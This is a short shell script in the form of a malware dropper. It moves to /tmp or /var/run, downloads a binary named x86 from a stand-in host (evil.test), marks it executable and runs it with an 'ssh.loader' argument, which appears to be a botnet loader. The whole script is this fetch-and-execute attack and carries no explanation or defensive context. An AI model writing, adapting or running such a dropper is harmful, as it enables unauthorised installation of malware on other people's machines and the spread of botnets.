#!/bin/sh
cd /tmp || cd /var/run
wget http://evil.test/bins/x86 -O x86
chmod +x x86
./x86 ssh.loader
